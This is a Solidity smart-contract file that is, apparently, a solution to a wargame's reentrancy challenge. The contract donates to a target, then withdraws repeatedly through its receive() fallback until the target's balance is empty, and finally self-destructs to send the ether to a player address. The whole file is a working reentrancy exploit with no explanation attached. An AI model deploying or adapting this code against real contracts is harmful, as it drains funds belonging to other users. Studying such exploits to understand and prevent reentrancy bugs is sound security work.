// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function withdraw(uint256) external;

    function donate(address) external payable;
}

contract PeeElephant {
    address payable targetAddress;
    IReentrancy target;
    address payable player;
    uint256 myDeposit;

    constructor(address _target, address _player) payable {
        targetAddress = payable(_target);
        target = IReentrancy(targetAddress);
        player = payable(_player);
        myDeposit = msg.value;
    }

    function attack() external payable {
        target.donate{value: myDeposit}(address(this));
        target.withdraw(myDeposit);
        uint256 totalDeposits = targetAddress.balance;

        require(totalDeposits == 0, "target balance less than 0");
        selfdestruct(player);
    }

    function withdrawEther() external returns (bool) {
        require(player == msg.sender, "only player can withdraw");
        uint256 currentBal = address(this).balance;
        (bool sent, ) = player.call{value: currentBal}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        //get balance of contract
        uint amount = min(myDeposit, targetAddress.balance);

        if (targetAddress.balance > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        uint amount = x <= y ? x : y;
        return amount;
    }
}
